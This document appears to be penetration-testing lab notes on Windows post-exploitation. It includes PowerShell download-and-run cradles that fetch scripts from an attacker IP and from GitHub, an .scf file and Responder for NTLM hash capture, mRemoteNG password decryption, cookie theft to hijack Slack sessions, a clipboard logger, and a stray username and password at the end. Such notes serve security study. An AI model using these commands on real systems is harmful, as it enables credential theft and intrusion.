Interacting with users:
 Wire shark installed?
		Capture credentials
		[net-creds](https://github.com/DanMcInerney/net-creds) to sniff passwords and hashes from a pcap
	Monitoring for Process command lines
		Create a powershell script:
				```While($true){			
				  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
				  Start-Sleep 1
				  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
				  Compare-Object -ReferenceObject $process -DifferenceObject $process2
					}```
			Host the script on the attacking machine and execute on target machine:
				`IEX (iwr 'http://10.10.10.205/procmon.ps1')`
	Shell Command File (SCF)
		Used by windows explorer to move up and down directories
		Can be manipulated to have the icon file location point to a specific UNC path. 
			Change the Icon file to an SMB session and run [Responder](https://github.com/lgandx/Responder), may be able to captire NTLM hashes.   
		Example:
			Make a file with '@' at the start and extension `.scf`, the @ makes sure windows see its straight away i.e `@test.scf`
				```[Shell]
				Command=2
				IconFile=\\<listener ip>\share\legit.ico
				[Taskbar]
				Command=ToggleDesktop```
			Start Responder 
					`sudo responder -wrf -v -I <tun0>`
			Crack the passwords
	Malicous .ink File
		Doesn't work on Server 2019 hosts.
		[Lnkbomb](https://github.com/dievus/lnkbomb) to create a .ink file
Pillaging 
	Obtaining information from a compromised system
	Identify Common Applications
		Program Files + (x86)
	 List Installed Programs
		 `$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* `
		`$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation`
		 `$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize`
		mRemoteNG
			Used to connect systems using RDP, VNC, SSH
			 Connection info and credentials saved to confCons.xml.
				 password is mR3m
			`ls C:\Users\julio\AppData\Roaming\mRemoteNG`	
			Decrypt password using [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)
				`python 3 mremoteg_decrypt.py -s <password> -p <custom password>`
				Run a for loop with a word list on it.
	Cookie Abuse to get access to Instant messengers.
		[Slack Abuse](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282)
		Firefox
			Copy Firefox cookies
				`copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
			[Cookie Extractor](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)
				`python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
			Use a [cookie editor extension](https://cookie-editor.cgagnier.ca/)
		Chromium 
			[Invoke-SharpChromium](https://github.com/djhohnstein/SharpChromium)
				`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
				`Invoke-SharpChromium -Command "cookies slack.com"
	Monitor Clipboard 
		`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
		`Invoke-ClipboardLogger`
	
	
	
	/u:jeff /p:Webmaster001!